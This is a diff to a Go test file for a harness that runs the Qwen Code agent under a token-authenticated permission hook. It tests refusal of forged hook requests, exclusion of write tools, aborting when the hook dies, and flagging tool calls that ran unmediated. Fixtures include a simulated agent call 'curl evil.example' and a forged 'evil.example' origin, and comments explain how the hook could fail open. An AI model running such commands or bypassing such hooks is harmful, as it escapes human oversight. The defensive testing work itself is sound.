@@ -7,10 +7,12 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"os"
 	"os/signal"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -33,6 +35,7 @@ func TestMain(m *testing.M) {
 //	{"$stderr":"boom"}                         write a line to stderr
 //	{"$block":true}                            wait to be interrupted
 //	{"$hookTool":"write_file","$hookInput":{}} call the permission hook
+//	{"$hookCallID":"call_1"}                   the stream id of that call
 //
 // The prompt read from stdin is echoed to stderr as "STDIN:<prompt>", the
 // command line as "ARGV:<json>", and any OPENAI_* variable that survived
@@ -76,11 +79,12 @@ func fakeCLI(script string) int {
 			continue
 		}
 		var directive struct {
-			Exit      *int            `json:"$exit"`
-			Stderr    string          `json:"$stderr"`
-			Block     bool            `json:"$block"`
-			HookTool  string          `json:"$hookTool"`
-			HookInput json.RawMessage `json:"$hookInput"`
+			Exit       *int            `json:"$exit"`
+			Stderr     string          `json:"$stderr"`
+			Block      bool            `json:"$block"`
+			HookTool   string          `json:"$hookTool"`
+			HookInput  json.RawMessage `json:"$hookInput"`
+			HookCallID string          `json:"$hookCallID"`
 		}
 		if err := json.Unmarshal([]byte(line), &directive); err != nil {
 			fmt.Fprintln(os.Stderr, "fake qwen: bad directive:", line)
@@ -94,7 +98,7 @@ func fakeCLI(script string) int {
 		case directive.Block:
 			select {}
 		case directive.HookTool != "":
-			if code := callHook(directive.HookTool, directive.HookInput); code != 0 {
+			if code := callHook(directive.HookTool, directive.HookInput, directive.HookCallID); code != 0 {
 				return code
 			}
 		}
@@ -105,7 +109,7 @@ func fakeCLI(script string) int {
 // callHook posts one PreToolUse event to the hook Sirdar named in the
 // settings file, and reports the verdict on stderr as
 // "HOOK:<tool>:<decision>:<reason>".
-func callHook(tool string, input json.RawMessage) int {
+func callHook(tool string, input json.RawMessage, callID string) int {
 	url, err := hookURLFromSettings(os.Getenv("QWEN_CODE_SYSTEM_SETTINGS_PATH"))
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "fake qwen: hook url:", err)
@@ -122,6 +126,7 @@ func callHook(tool string, input json.RawMessage) int {
 		"tool_name":       tool,
 		"tool_input":      input,
 		"tool_use_id":     "toolu_" + tool,
+		"tool_call_id":    callID,
 	})
 	resp, err := http.Post(url, "application/json", strings.NewReader(body))
 	if err != nil {
@@ -379,16 +384,9 @@ func TestPolicyEnforcesTheBashAllowList(t *testing.T) {
 // mediator: Qwen Code is blocked waiting for an answer, so a payload that
 // cannot be read still gets one, and it is a refusal.
 func TestUnparseableHookRequestIsDenied(t *testing.T) {
-	s := &session{
-		policy: &provider.PermissionPolicy{},
-		events: make(chan provider.Event, 8),
-	}
+	s := newTestSession("tok")
 	rec := &recorder{}
-	req, err := http.NewRequest(http.MethodPost, hookPath, strings.NewReader(`{"tool_input":{}}`))
-	if err != nil {
-		t.Fatal(err)
-	}
-	s.decide(rec, req)
+	s.decide(rec, hookPost(t, s, `{"tool_input":{}}`))
 
 	var out struct {
 		HookSpecificOutput struct {
@@ -412,6 +410,160 @@ func TestUnparseableHookRequestIsDenied(t *testing.T) {
 		}
 	default:
 		t.Fatal("an unreadable hook request was not surfaced")
+	}
+}
+
+// newTestSession is a session with just enough of itself to answer the
+// permission hook directly, without a child process.
+func newTestSession(token string) *session {
+	return &session{
+		policy:  &provider.PermissionPolicy{BashAllow: []string{"git log*"}},
+		token:   token,
+		decided: map[string]struct{}{},
+		started: map[string]string{},
+		events:  make(chan provider.Event, 8),
+	}
+}
+
+// hookPost builds the request Qwen Code's HTTP hook makes: POST, JSON, the
+// session's token as the last path segment, and no Origin.
+func hookPost(t *testing.T, s *session, body string) *http.Request {
+	t.Helper()
+	req, err := http.NewRequest(http.MethodPost, hookPathPrefix+s.token, strings.NewReader(body))
+	if err != nil {
+		t.Fatal(err)
+	}
+	req.Header.Set("Content-Type", "application/json")
+	return req
+}
+
+// TestForgedHookRequestsAreRefused is the authentication half of the
+// mediator. The listener speaks plain HTTP on loopback, so without a
+// secret any local process — or any page the operator has open — could
+// forge permission records into the run's event log, or flood the endpoint
+// until a genuine decision missed the CLI's 15 s hook timeout, which is a
+// deny turned into an allow.
+func TestForgedHookRequestsAreRefused(t *testing.T) {
+	s := newTestSession("0123456789abcdef")
+	genuine := `{"tool_name":"run_shell_command","tool_input":{"command":"git log -1"},"tool_call_id":"call_1"}`
+
+	forgeries := []struct {
+		name string
+		req  func() *http.Request
+		code int
+	}{
+		{"no token", func() *http.Request {
+			r, _ := http.NewRequest(http.MethodPost, "/decide/", strings.NewReader(genuine))
+			r.Header.Set("Content-Type", "application/json")
+			return r
+		}, http.StatusUnauthorized},
+		{"wrong token", func() *http.Request {
+			r, _ := http.NewRequest(http.MethodPost, "/decide/0123456789abcdee", strings.NewReader(genuine))
+			r.Header.Set("Content-Type", "application/json")
+			return r
+		}, http.StatusUnauthorized},
+		{"token prefix", func() *http.Request {
+			r, _ := http.NewRequest(http.MethodPost, "/decide/0123456789", strings.NewReader(genuine))
+			r.Header.Set("Content-Type", "application/json")
+			return r
+		}, http.StatusUnauthorized},
+		{"GET", func() *http.Request {
+			r, _ := http.NewRequest(http.MethodGet, hookPathPrefix+s.token, nil)
+			r.Header.Set("Content-Type", "application/json")
+			return r
+		}, http.StatusUnauthorized},
+		{"browser origin", func() *http.Request {
+			r := hookPost(t, s, genuine)
+			r.Header.Set("Origin", "http://evil.example")
+			return r
+		}, http.StatusUnauthorized},
+		{"form encoded", func() *http.Request {
+			r, _ := http.NewRequest(http.MethodPost, hookPathPrefix+s.token, strings.NewReader(genuine))
+			r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+			return r
+		}, http.StatusUnsupportedMediaType},
+	}
+	for _, f := range forgeries {
+		rec := &recorder{}
+		s.decide(rec, f.req())
+		if rec.code != f.code {
+			t.Errorf("%s: status %d, want %d", f.name, rec.code, f.code)
+		}
+		if strings.Contains(rec.body.String(), "permissionDecision") {
+			t.Errorf("%s: a forged request was answered with a decision: %q", f.name, rec.body.String())
+		}
+		select {
+		case ev := <-s.events:
+			t.Errorf("%s: a forged request produced an event: %+v", f.name, ev)
+		default:
+		}
+	}
+
+	// The genuine shape still works, and the token is nowhere in what it
+	// produces.
+	rec := &recorder{}
+	s.decide(rec, hookPost(t, s, genuine))
+	if !strings.Contains(rec.body.String(), `"permissionDecision":"allow"`) {
+		t.Fatalf("the CLI's own request must be answered: %q", rec.body.String())
+	}
+	select {
+	case ev := <-s.events:
+		if ev.Kind != provider.EvPermission || ev.Decision != "allow" {
+			t.Fatalf("event %+v", ev)
+		}
+		if strings.Contains(string(ev.Raw)+ev.Text, s.token) {
+			t.Fatal("the hook token reached an event")
+		}
+	default:
+		t.Fatal("a genuine request produced no permission event")
+	}
+}
+
+// TestProbeRejectsAForgedToken keeps the reachability endpoint from being
+// a way to learn that a session is running, or to reach the mux at all.
+func TestProbeRejectsAForgedToken(t *testing.T) {
+	s := newTestSession("abcdef")
+	rec := &recorder{}
+	req, err := http.NewRequest(http.MethodPost, probePathPrefix+"nope", nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	s.probe(rec, req)
+	if rec.code != http.StatusUnauthorized {
+		t.Fatalf("probe status %d, want 401", rec.code)
+	}
+
+	rec = &recorder{}
+	req, err = http.NewRequest(http.MethodPost, probePathPrefix+s.token, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	s.probe(rec, req)
+	if rec.code != http.StatusNoContent {
+		t.Fatalf("probe status %d, want 204", rec.code)
+	}
+}
+
+// TestProbeFailsWhenNothingIsListening is what Start leans on: an
+// unreachable hook is an unmediated session, so it must be an error and
+// not a warning. The error must not name the URL, because the URL carries
+// the session's token.
+func TestProbeFailsWhenNothingIsListening(t *testing.T) {
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	addr := ln.Addr().String()
+	if err := ln.Close(); err != nil {
+		t.Fatal(err)
+	}
+	token := "cafebabe"
+	err = probeHook("http://" + addr + probePathPrefix + token)
+	if err == nil {
+		t.Fatal("a dead listener must fail the probe")
+	}
+	if strings.Contains(err.Error(), token) {
+		t.Fatalf("the probe error leaked the hook token: %v", err)
 	}
 }
 
@@ -456,6 +608,9 @@ func TestArgs(t *testing.T) {
 	if v := flagValue(got, "--json-schema"); v != `{"type":"object"}` {
 		t.Fatalf("--json-schema %q", v)
 	}
+	if v := flagValue(got, "--max-tool-calls"); v != "36" {
+		t.Fatalf("--max-tool-calls %q, want the turn budget scaled", v)
+	}
 	for _, never := range []string{"--bare", "--safe-mode", "--yolo", "--input-format", "--acp"} {
 		if contains(got, never) {
 			t.Fatalf("%s must never be passed: %v", never, got)
@@ -465,16 +620,27 @@ func TestArgs(t *testing.T) {
 		t.Fatal("an unconfigured endpoint must leave auth to the operator's own login")
 	}
 
-	// Without bash patterns the shell stays under Qwen Code's own
-	// headless deny, which is the only fail-closed guarantee there is:
-	// the permission hook fails open when it cannot be reached.
+	// A session that named no turn budget is still bounded.
+	if v := flagValue(args(provider.SessionSpec{OutputSchema: []byte(`{}`)}, Endpoint{}, nil),
+		"--max-tool-calls"); v != strconv.Itoa(defaultMaxToolCalls) {
+		t.Fatalf("--max-tool-calls %q with no budget, want the default", v)
+	}
+
+	// Without bash patterns the shell is excluded outright.
 	spec.Policy = &provider.PermissionPolicy{}
-	if contains(args(spec, Endpoint{}, nil), "--allowed-tools") {
+	noShell := args(spec, Endpoint{}, nil)
+	if contains(noShell, "--allowed-tools") {
 		t.Fatal("a workspace that named no bash patterns must get no shell")
+	}
+	if !excludes(noShell, shellTool) {
+		t.Fatalf("the shell must be excluded, not merely left un-allowed: %v", noShell)
 	}
 	spec.Policy = nil
 	if contains(args(spec, Endpoint{}, nil), "--allowed-tools") {
 		t.Fatal("a nil policy must get no shell")
+	}
+	if !excludes(args(spec, Endpoint{}, nil), shellTool) {
+		t.Fatal("a nil policy must exclude the shell")
 	}
 
 	full := Endpoint{Model: "m2", BaseURL: "http://x/v1", APIKey: "k"}
@@ -484,6 +650,47 @@ func TestArgs(t *testing.T) {
 	}
 	if v := flagValue(got, "--model"); v != "m2" {
 		t.Fatalf("the endpoint's model must be used when the spec names none: %v", got)
+	}
+}
+
+// TestWriteToolsAreExcludedWhateverTheSettingsSay is the read-only
+// guarantee. Qwen Code's own headless deny for the write tools and the
+// shell is skipped whenever isExplicitlyAllowed matches, and that consults
+// permissions.allow / tools.allowed / tools.core merged across the system,
+// user and workspace settings layers — none of which Sirdar controls.
+// --exclude-tools is appended to the deny list without consulting any of
+// them, and deny beats allow, so the exclusion is the guarantee and the
+// settings file is only the belt-and-braces half.
+func TestWriteToolsAreExcludedWhateverTheSettingsSay(t *testing.T) {
+	spec := provider.SessionSpec{
+		OutputSchema: []byte(`{}`),
+		Policy:       &provider.PermissionPolicy{BashAllow: []string{"git log*"}},
+	}
+	got := args(spec, Endpoint{}, nil)
+
+	for _, tool := range []string{
+		"write_file", "edit", "replace", "notebook_edit", "monitor",
+		"save_memory", "image_gen", "enter_worktree", "exit_worktree",
+		"artifact", "record_artifact", "cron_create", "workflow",
+		"send_message", "create_sub_session",
+	} {
+		if !excludes(got, tool) {
+			t.Errorf("%q must be excluded on every session: %v", tool, got)
+		}
+	}
+	// The shell is the one exception, and only for a workspace that named
+	// bash patterns: the hook decides each command, and a hook that stops
+	// answering aborts the session.
+	if excludes(got, shellTool) {
+		t.Fatal("a workspace with bash patterns must keep the shell for the hook to judge")
+	}
+	if !contains(got, "--allowed-tools") {
+		t.Fatalf("the shell must be allow-listed for the hook to see it: %v", got)
+	}
+	// monitor takes a command string of its own, so it stays excluded
+	// even when the shell is allowed.
+	if !excludes(got, "monitor") {
+		t.Fatal("monitor is a second shell and must never be allowed")
 	}
 }
 
@@ -796,6 +1003,117 @@ func TestCancelSendsInterrupt(t *testing.T) {
 	<-drained
 }
 
+// TestHookDeathAbortsTheSession is the fail-open fix. Qwen Code treats a
+// connection failure, a timeout and a non-2xx alike as a non-blocking hook
+// failure and runs the tool anyway, so a permission listener that stops
+// serving mid-run leaves the session unmediated. The session has to end
+// instead, and say why.
+func TestHookDeathAbortsTheSession(t *testing.T) {
+	script := writeScript(t,
+		`{"type":"system","subtype":"init","session_id":"h1"}`,
+		`{"$block":true}`,
+	)
+	s, err := New().Start(context.Background(), fakeSpec(t, script))
+	if err != nil {
+		t.Fatal(err)
+	}
+	sess := s.(*session)
+
+	deadline := time.Now().Add(3 * time.Second)
+	for s.Handle() == "" && time.Now().Before(deadline) {
+		time.Sleep(5 * time.Millisecond)
+	}
+	if s.Handle() != "h1" {
+		t.Fatalf("session did not start, handle %q", s.Handle())
+	}
+
+	// An early Serve return, which is what a listener closed under the
+	// server looks like from inside the session.
+	if err := sess.hook.Close(); err != nil {
+		t.Fatal(err)
+	}
+
+	type outcome struct {
+		events []provider.Event
+		res    provider.Result
+	}
+	done := make(chan outcome, 1)
+	go func() {
+		var evs []provider.Event
+		for ev := range s.Events() {
+			evs = append(evs, ev)
+		}
+		res, _ := s.Wait()
+		done <- outcome{evs, res}
+	}()
+
+	select {
+	case got := <-done:
+		var aborted bool
+		for _, ev := range kinds(got.events, provider.EvError) {
+			if strings.Contains(ev.Text, "permission hook stopped serving") {
+				aborted = true
+			}
+		}
+		if !aborted {
+			t.Fatalf("no abort event on the stream: %+v", got.events)
+		}
+		if got.res.ExitErr == nil || !strings.Contains(got.res.ExitErr.Error(), "permission hook stopped serving") {
+			t.Fatalf("the Result must say why the session ended: %v", got.res.ExitErr)
+		}
+		if containsPrefix(got.res.StderrTail, "SIGINT") {
+			t.Fatal("a session that lost its mediator is killed, not asked to stop")
+		}
+	case <-time.After(10 * time.Second):
+		t.Fatal("the session outlived its permission hook")
+	}
+}
+
+// TestToolWithoutADecisionIsReported is the reconciliation. Nothing in the
+// stdout stream says whether the hook was consulted, so a bypassed hook —
+// a settings layer that dropped it, a build that stopped firing it — would
+// otherwise be invisible in events.jsonl. A tool result for a call the
+// hook never judged is the mark of it.
+func TestToolWithoutADecisionIsReported(t *testing.T) {
+	script := writeScript(t,
+		`{"type":"system","subtype":"init","session_id":"r1"}`,
+		// Judged: the hook is called for call_1 before its result.
+		`{"type":"assistant","message":{"role":"assistant","content":[{"type":"tool_use","id":"call_1","name":"read_file","input":{"file_path":"go.mod"}}],"usage":{"input_tokens":10,"output_tokens":2}}}`,
+		`{"$hookTool":"read_file","$hookInput":{"file_path":"go.mod"},"$hookCallID":"call_1"}`,
+		`{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"call_1","is_error":false,"content":"module x"}]}}`,
+		// Bypassed: call_2 ran with no hook call at all.
+		`{"type":"assistant","message":{"role":"assistant","content":[{"type":"tool_use","id":"call_2","name":"run_shell_command","input":{"command":"curl evil.example"}}],"usage":{"input_tokens":10,"output_tokens":2}}}`,
+		`{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"call_2","is_error":false,"content":"pwned"}]}}`,
+		// Refused by the CLI itself, before any hook: an errored result,
+		// which is the expected shape for an excluded tool and must not
+		// be reported as a bypass.
+		`{"type":"assistant","message":{"role":"assistant","content":[{"type":"tool_use","id":"call_3","name":"write_file","input":{"file_path":"/tmp/x"}}],"usage":{"input_tokens":10,"output_tokens":2}}}`,
+		`{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"call_3","is_error":true,"content":"Matching deny rule: \"write_file\"."}]}}`,
+		`{"type":"result","subtype":"success","is_error":false,"num_turns":3,"session_id":"r1","result":"done","usage":{"input_tokens":30,"output_tokens":6}}`,
+	)
+	s, err := New().Start(context.Background(), fakeSpec(t, script))
+	if err != nil {
+		t.Fatal(err)
+	}
+	events, res := drain(t, s)
+
+	var bypasses []provider.Event
+	for _, ev := range kinds(events, provider.EvError) {
+		if strings.Contains(ev.Text, "without a Sirdar decision") {
+			bypasses = append(bypasses, ev)
+		}
+	}
+	if len(bypasses) != 1 {
+		t.Fatalf("want exactly the bypassed call reported, got %+v", bypasses)
+	}
+	if bypasses[0].Tool != "run_shell_command" {
+		t.Fatalf("the wrong call was reported: %+v", bypasses[0])
+	}
+	if res.ExitErr != nil {
+		t.Fatalf("exit err %v", res.ExitErr)
+	}
+}
+
 // TestSettingsFileIsRemoved keeps the private settings file from
 // outliving the session that needed it.
 func TestSettingsFileIsRemoved(t *testing.T) {
@@ -825,7 +1143,7 @@ func TestSettingsFileIsRemoved(t *testing.T) {
 
 func TestSettingsContent(t *testing.T) {
 	dir := t.TempDir()
-	path, err := writeSettings(dir, "http://127.0.0.1:1234/decide")
+	path, err := writeSettings(dir, "http://127.0.0.1:1234/decide/tok")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -847,9 +1165,70 @@ func TestSettingsContent(t *testing.T) {
 		}
 	}
 	url, err := hookURLFromSettings(path)
-	if err != nil || url != "http://127.0.0.1:1234/decide" {
+	if err != nil || url != "http://127.0.0.1:1234/decide/tok" {
 		t.Fatalf("hook url %q / %v", url, err)
 	}
+
+	info, err := os.Stat(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if info.Mode().Perm() != 0o600 {
+		t.Fatalf("the file carrying the hook token is mode %v", info.Mode().Perm())
+	}
+}
+
+// TestHookTokensAreUnique keeps two concurrent sessions — a run and the
+// schema retry that resumes it — from being able to answer for each other.
+func TestHookTokensAreUnique(t *testing.T) {
+	seen := map[string]bool{}
+	for i := 0; i < 64; i++ {
+		tok, err := newHookToken()
+		if err != nil {
+			t.Fatal(err)
+		}
+		if len(tok) != hookTokenBytes*2 {
+			t.Fatalf("token length %d", len(tok))
+		}
+		if seen[tok] {
+			t.Fatal("newHookToken repeated itself")
+		}
+		seen[tok] = true
+	}
+}
+
+// TestCancelRemovesTheSettingsFile covers the caller that cancels a
+// session and never Waits: the 0600 file naming the hook and carrying its
+// token must not be left on disk.
+func TestCancelRemovesTheSettingsFile(t *testing.T) {
+	script := writeScript(t,
+		`{"type":"system","subtype":"init","session_id":"c1"}`,
+		`{"$block":true}`,
+	)
+	s, err := New().Start(context.Background(), fakeSpec(t, script))
+	if err != nil {
+		t.Fatal(err)
+	}
+	dir := s.(*session).settingsIn
+	go func() {
+		for range s.Events() {
+		}
+	}()
+
+	deadline := time.Now().Add(3 * time.Second)
+	for s.Handle() == "" && time.Now().Before(deadline) {
+		time.Sleep(5 * time.Millisecond)
+	}
+	s.Cancel()
+
+	deadline = time.Now().Add(10 * time.Second)
+	for time.Now().Before(deadline) {
+		if _, err := os.Stat(dir); os.IsNotExist(err) {
+			return
+		}
+		time.Sleep(10 * time.Millisecond)
+	}
+	t.Fatal("the settings file outlived a cancelled session that was never waited on")
 }
 
 func TestPolicyName(t *testing.T) {
@@ -936,6 +1315,16 @@ func flagValue(argv []string, name string) string {
 		}
 	}
 	return ""
+}
+
+// excludes reports whether argv carries `--exclude-tools <tool>`.
+func excludes(argv []string, tool string) bool {
+	for i, a := range argv {
+		if a == "--exclude-tools" && i+1 < len(argv) && argv[i+1] == tool {
+			return true
+		}
+	}
+	return false
 }
 
 func countFlag(argv []string, name string) int {
